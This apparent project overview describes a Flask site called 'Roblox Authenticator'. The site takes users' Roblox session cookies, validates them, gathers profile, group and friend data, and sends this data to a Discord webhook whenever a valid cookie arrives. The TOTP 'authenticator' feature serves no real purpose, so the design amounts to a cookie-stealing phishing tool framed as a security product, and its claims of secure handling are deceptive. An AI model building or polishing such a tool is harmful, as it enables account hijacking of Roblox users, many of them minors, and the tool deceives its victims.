# Roblox Authenticator

## Overview

This is a Flask-based web application that provides time-based one-time password (TOTP) authentication for Roblox users. The application allows users to input their Roblox cookie, validates it against Roblox's API, and generates TOTP codes for secure authentication.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Backend Architecture
- **Framework**: Flask web framework with SQLAlchemy ORM
- **Language**: Python 3.x
- **Database**: SQLite (default) with support for PostgreSQL via environment configuration
- **Session Management**: Flask sessions with secure cookie handling
- **Authentication**: Custom Roblox cookie validation with TOTP generation

### Frontend Architecture
- **Template Engine**: Jinja2 (Flask's default)
- **CSS Framework**: Bootstrap 5.3.0
- **Icons**: Font Awesome 6.4.0
- **Theme**: Custom gaming-themed dark UI with cosmic effects
- **JavaScript**: Vanilla JS for interactive elements and particle effects

### Security Architecture
- TOTP (Time-based One-Time Password) implementation using PyOTP
- Secure session management with configurable secret keys
- Cookie validation against Roblox's official API
- Environment-based configuration for sensitive data

## Key Components

### Core Application Files
- **app.py**: Main Flask application setup, database configuration, and initialization
- **main.py**: Application entry point for development server
- **models.py**: SQLAlchemy database models (UserSession)
- **routes.py**: Flask route handlers for web endpoints
- **roblox_auth.py**: Roblox API integration and TOTP functionality

### Database Schema
- **UserSession Model**: Stores user session data including:
  - Session ID (unique identifier)
  - Roblox cookie (encrypted storage)
  - User information (username, user_id)
  - TOTP secret for code generation
  - Timestamps for creation and last access

### Frontend Components
- **Base Template**: Common layout with navigation and cosmic theme
- **Index Page**: Cookie input form for initial setup
- **Authenticator Page**: TOTP code display with real-time updates
- **Custom CSS**: Gaming-themed styling with glowing effects and animations
- **JavaScript**: Interactive particle effects and UI enhancements

## Data Flow

1. **User Registration**:
   - User submits Roblox cookie via web form
   - Cookie is validated against Roblox Users API
   - TOTP secret is generated and stored
   - User session is created in database

2. **Authentication Process**:
   - User accesses authenticator page
   - TOTP codes are generated using stored secret
   - Codes refresh automatically every 30 seconds
   - Visual timer indicates code expiration

3. **Session Management**:
   - Sessions are tracked via unique session IDs
   - Last access time is updated on each visit
   - Secure logout functionality clears session data

## External Dependencies

### Python Packages
- **Flask**: Web framework and routing
- **Flask-SQLAlchemy**: Database ORM
- **requests**: HTTP client for Roblox API calls
- **pyotp**: TOTP implementation
- **Werkzeug**: WSGI utilities and proxy handling

### Frontend Dependencies
- **Bootstrap 5.3.0**: CSS framework (CDN)
- **Font Awesome 6.4.0**: Icon library (CDN)

### External APIs
- **Roblox Users API**: Cookie validation and user information retrieval
  - Endpoint: `https://users.roblox.com/v1/users/authenticated`
  - Purpose: Validate cookies and fetch user details
- **Roblox Profile API**: Additional user information
  - Endpoint: `https://users.roblox.com/v1/users/{user_id}`
  - Purpose: Get profile details, description, creation date
- **Roblox Games API**: User's game information
  - Endpoint: `https://games.roblox.com/v2/users/{user_id}/games`
  - Purpose: Fetch recently played/created games
- **Roblox Groups API**: User's group memberships
  - Endpoint: `https://groups.roblox.com/v2/users/{user_id}/groups/roles`
  - Purpose: Get user's groups and roles
- **Roblox Friends API**: Social connection counts
  - Endpoints: Various friends/followers/following count endpoints
  - Purpose: Get social statistics
- **Discord Webhook**: Send validation notifications
  - Webhook URL: Configured for sending user data when valid cookies are detected
  - Purpose: Notify when valid Roblox cookies are submitted

## Deployment Strategy

### Environment Configuration
- **Database**: Configurable via `DATABASE_URL` environment variable
- **Security**: Session secret via `SESSION_SECRET` environment variable
- **Proxy Support**: ProxyFix middleware for deployment behind reverse proxies

### Development Setup
- SQLite database for local development
- Debug mode enabled in main.py
- Comprehensive logging for troubleshooting

### Production Considerations
- Database connection pooling with automatic reconnection
- Secure session key configuration
- WSGI-compatible deployment
- Environment-based configuration management

### Key Design Decisions

1. **Database Choice**: SQLAlchemy with SQLite default provides easy setup while supporting PostgreSQL for production scaling
2. **Authentication Method**: TOTP provides secure, time-based authentication without requiring SMS or email
3. **Cookie Storage**: Encrypted storage of Roblox cookies for persistent authentication
4. **UI Theme**: Gaming-focused dark theme appeals to Roblox user demographic
5. **API Integration**: Direct Roblox API validation ensures real-time cookie verification

The application prioritizes security through proper session management, encrypted storage, and environment-based configuration while maintaining a user-friendly interface optimized for the gaming community.